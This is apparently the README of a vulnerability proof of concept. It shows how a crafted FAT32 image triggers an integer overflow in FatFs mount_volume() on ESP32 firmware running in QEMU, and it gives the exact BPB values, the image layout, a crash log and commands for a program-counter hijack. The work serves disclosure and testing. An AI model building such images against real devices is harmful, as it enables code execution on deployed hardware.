# ESP32 QEMU — FatFs Vulnerability Demonstration

This directory contains a complete, self-contained Docker test case that
demonstrates the FatFs R0.16 **CVE-2026-6682** vulnerability (FAT32 integer overflow
in `mount_volume()`) running on **real ESP-IDF firmware** inside the
**Espressif QEMU ESP32 emulator**.

## Why This Matters

ESP-IDF is the official development framework for all Espressif SoCs (ESP32,
ESP32-S2/S3, ESP32-C3/C6/H2) with **17,655+ GitHub stars** and **8,170+ forks**.
It is the mandatory starting point for every commercial and hobbyist ESP32
product.  The FatFs library is bundled as a first-class component at
`components/fatfs/src/ff.c` (version R0.16).

The vulnerability exploits the **most widely-copied code pattern** in the
ESP-IDF ecosystem — the `stat()` → `malloc()` → `fread()` chain that appears
in the official [wear\_levelling example](https://github.com/espressif/esp-idf/blob/master/examples/storage/wear_levelling/main/wear_levelling_example_main.c)
and is reproduced in thousands of downstream projects:

```c
struct stat st;
stat("/sdcard/firmware.bin", &st);
uint8_t *buf = malloc(st.st_size);      /* attacker-controlled size! */
fread(buf, 1, st.st_size, fp);          /* heap overflow */
```

## Quick Start

```bash
# Build and run the complete test in Docker (~15 minutes first time)
chmod +x run.sh
./run.sh

# Or manually:
docker build -t fatfs-esp32-vuln-test .
docker run --rm fatfs-esp32-vuln-test
```

### Requirements

- Docker 19.03+ (Linux, macOS, or Windows with WSL2)
- ~6 GB disk space (ESP-IDF Docker image + build artifacts)
- ~15 minutes for first build (Docker caches subsequent builds)

## What It Does

1. **Builds** an ESP32 application using ESP-IDF v5.3 that mounts a FatFs
   partition from SPI flash and reads a file using the standard POSIX APIs
   (`stat()`, `open()`, `read()`)

2. **Generates** a crafted FAT32 partition image that triggers the CVE-2026-6682
   integer overflow in `mount_volume()`:
   - `BPB_FATSz32 = 0x80000001`, `NumFATs = 2`
   - `fasize = 0x80000001 × 2 = 0x100000002` → truncated to `0x00000002`
   - This causes `fs->database` to land at sector 6 (inside the FAT region)
   - A fake directory entry at sector 6 reports `FIRMWARE.BIN` with
     `DIR_FileSize = 0x01000000` (16 MB)

3. **Injects** the crafted image into the ESP32 flash image at the storage
   partition offset (0x110000)

4. **Runs** the ESP32 firmware in the Espressif QEMU emulator

5. **Demonstrates** the full exploitation chain in three phases:

   - **Phase 1 — Attacker-controlled fsize:** `stat()` returns a 16 MB file
     size from a 2 MB partition, confirming the CVE-2026-6682 integer overflow

   - **Phase 2 — Memory corruption:** A simulated OTA firmware-update handler
     (modelled on `rce_demo.c`) reads the file into a 128-byte struct buffer.
     The read delivers 512 bytes of attacker data (0x41), overflowing into
     the CRC, version, and function-pointer fields

   - **Phase 3 — RCE proof:** The corrupted function pointer (now 0x41414141)
     is called, crashing the ESP32 with `PC = 0x41414141` — proof that the
     attacker controls the program counter

## Expected Output

```
============================================================
  FatFs R0.16 Vulnerability Demonstration - ESP32 via QEMU
============================================================
  Target SDK:  espressif/esp-idf (17,655 stars, 8,170 forks)
  FatFs ver:   R0.16 (bundled in components/fatfs/src/ff.c)
  Bug:         CVE-2026-6682 - FAT32 integer overflow in mount_volume()
  Attack:      stat() -> struct overflow -> function pointer RCE
  Pattern:     Copied from official wear_levelling example
============================================================

I (xxx) fatfs_vuln: Mounting raw FatFs partition 'storage' at /storage...
I (xxx) fatfs_vuln: FatFs partition mounted successfully at /storage

--- Phase 1: stat() returns attacker-controlled finfo.fsize ---

W (xxx) fatfs_vuln:   stat() returned: st_size = 16777216 bytes (0x01000000)

E (xxx) fatfs_vuln:   [VULN-BUG1-CONFIRMED]
E (xxx) fatfs_vuln:   File size 16777216 EXCEEDS the 2 MB partition!

--- Phase 2: Memory corruption via struct overflow ---

I (xxx) fatfs_vuln: OTA context BEFORE read:
I (xxx) fatfs_vuln:   expected_crc = 0xdeadbeef (canary)
I (xxx) fatfs_vuln:   fw_version   = 0x00010002 (canary)
I (xxx) fatfs_vuln:   on_complete  = 0x400d1234 (legitimate_update_callback)

W (xxx) fatfs_vuln: Performing vulnerable read: read(fd, ctx.fw_header, 16777216)

I (xxx) fatfs_vuln: OTA context AFTER read (512 bytes written):
I (xxx) fatfs_vuln:   expected_crc = 0x41414141  (was 0xdeadbeef)
I (xxx) fatfs_vuln:   fw_version   = 0x41414141  (was 0x00010002)
I (xxx) fatfs_vuln:   on_complete  = 0x41414141  (was 0x400d1234)

E (xxx) fatfs_vuln:   [VULN-CORRUPTION-CONFIRMED]
E (xxx) fatfs_vuln:   [VULN-RCE-VECTOR] Function pointer overwritten!

--- Phase 3: RCE proof — calling corrupted function pointer ---

W (xxx) fatfs_vuln: Calling ctx.on_complete() which now points to 0x41414141...

Guru Meditation Error: Core  0 panic'ed (InstrFetchProhibited).
Core  0 register dump:
PC      : 0x41414141  ...
```

The `PC: 0x41414141` in the crash dump proves the attacker controls the
program counter.  On real ESP32 hardware (no ASLR), they would set this to
the address of their shellcode for full remote code execution.

## CVE-2026-6682 Vulnerability Details

### Root Cause

In `ff.c` `mount_volume()`, the FAT size calculation uses a DWORD multiply:

```c
szbfat = ld_dword(fs->win + BPB_FATSz32);   // 0x80000001
fs->fsize = szbfat;
fasize = szbfat * nfat;                       // 0x80000001 * 2 = overflow!
```

When `BPB_FATSz32 = 0x80000001` and `NumFATs = 2`, the 64-bit result
`0x100000002` is truncated to the 32-bit DWORD `0x00000002`.  This causes
`fs->database` (the start of the data area) to be computed as sector 6
instead of the correct sector `0x100000006`.

### Exploitation Path

1. **Attacker** prepares a crafted SD card / flash image with the overflow VBR
2. **Attacker** plants a fake directory entry at sector 6 (inside the FAT region)
   with `DIR_FileSize` set to any desired value (16 MB in this demo)
3. **Victim application** mounts the filesystem — `mount_volume()` overflows
4. **Victim application** calls `stat()` → ESP-IDF's `vfs_fat.c` calls `f_stat()`
   → returns the attacker-controlled `finfo.fsize` as `st.st_size`
5. **Victim application** does `malloc(st.st_size)` + `fread()` → heap overflow

### ESP-IDF Propagation

The vulnerable code path in ESP-IDF's `components/fatfs/vfs/vfs_fat.c`:

```c
static void update_stat_struct(struct stat *st, FILINFO *info)
{
    memset(st, 0, sizeof(*st));
    st->st_size = info->fsize;   /* ← attacker-controlled under CVE-2026-6682 */
}
```

### Worst-Case Impact

- **Remote Code Execution** via heap overflow on any ESP32 device that reads
  a file size from FatFs and uses it as a buffer allocation size
- Affects every ESP32 application using the standard stat/malloc/read pattern
- No authentication required — physical access to the SD card slot is sufficient

## Architecture

```
esp32-qemu-test/
├── Dockerfile                  Docker image: ESP-IDF + QEMU + build + run
├── run.sh                      Host-side convenience script
├── README.md                   This file
├── app/                        ESP-IDF application
│   ├── CMakeLists.txt          Project configuration
│   ├── sdkconfig.defaults      ESP-IDF Kconfig defaults
│   ├── partitions.csv          Custom partition table (includes FAT partition)
│   └── main/
│       ├── CMakeLists.txt      Component registration
│       └── fatfs_vuln_test.c   Vulnerability demonstration application
└── scripts/
    ├── run_test.sh             Container entrypoint (merge → inject → QEMU)
    └── gen_exploit_image.py    CVE-2026-6682 exploit image generator + injector
```

### Partition Layout

| Name     | Type | SubType | Offset     | Size   | Purpose                  |
|----------|------|---------|------------|--------|--------------------------|
| nvs      | data | nvs     | 0x009000   | 16 KB  | Non-volatile storage     |
| phy_init | data | phy     | 0x00F000   | 4 KB   | PHY calibration          |
| factory  | app  | factory | 0x010000   | 1 MB   | Application binary       |
| storage  | data | fat     | 0x110000   | 2 MB   | **FatFs partition** ← exploit target |

### Flash Image Structure

```
┌──────────────────────────────────────────┐  0x000000
│  Bootloader (bootloader.bin)             │
├──────────────────────────────────────────┤  0x008000
│  Partition Table (partition-table.bin)    │
├──────────────────────────────────────────┤  0x010000
│  Application (fatfs_vuln_test.bin)        │
├──────────────────────────────────────────┤  0x110000
│  Storage Partition (EXPLOIT IMAGE)        │  ← injected by gen_exploit_image.py
│  ┌─────────────────────────────────────┐ │
│  │ Sector 0:  Crafted VBR              │ │  BPB_FATSz32 = 0x80000001
│  │ Sector 4:  FAT1                     │ │  Cluster chain: 0→1→2(root)→4(file)
│  │ Sector 5:  FAT2                     │ │  (mirror)
│  │ Sector 6:  Fake root dir entry      │ │  FIRMWARE.BIN, fsize=16MB
│  │ Sector 8:  Attacker payload data    │ │  0x41 'A' fill (512 bytes)
│  └─────────────────────────────────────┘ │
├──────────────────────────────────────────┤  0x310000
│  Unused (0xFF)                           │
└──────────────────────────────────────────┘  0x400000 (4 MB)
```

## Debugging

```bash
# Open a shell in the container
./run.sh --shell

# Inside the container:
. $IDF_PATH/export.sh
cd /opt/fatfs-test/app

# Rebuild if needed
idf.py build

# Run the test manually
bash /opt/fatfs-test/scripts/run_test.sh

# Or run QEMU manually with GDB
cd build
esptool.py --chip esp32 merge_bin --fill-flash-size 4MB -o flash_image.bin @flash_args
python3 /opt/fatfs-test/scripts/gen_exploit_image.py flash_image.bin flash_exploit.bin
qemu-system-xtensa -nographic -machine esp32 \
    -drive file=flash_exploit.bin,if=mtd,format=raw \
    -s -S  # Wait for GDB
```

## Other Vulnerabilities

This demo focuses on **CVE-2026-6682** because it is the highest-impact vulnerability
with the clearest exploitation path on ESP32.  The repository also contains
exploit images for all seven FatFs bugs — see `harness/img/` and
`02_CRITICAL.md` for the complete analysis.

ESP-IDF is also affected by **CVE-2026-6685** (stale dirty-cache skip on fragmented
volumes), which requires read-write access and fragmented files to trigger.

## References

- [ESP-IDF FatFs Documentation](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/storage/fatfs.html)
- [ESP-IDF QEMU Emulator Guide](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-guides/tools/qemu.html)
- [02_CRITICAL.md](../02_CRITICAL.md) — Full vulnerability analysis
- [exploit_disks.c](../harness/exploit_disks.c) — Exploit image generator (C)
- [rce_demo.c](../harness/rce_demo.c) — Standalone RCE demonstration
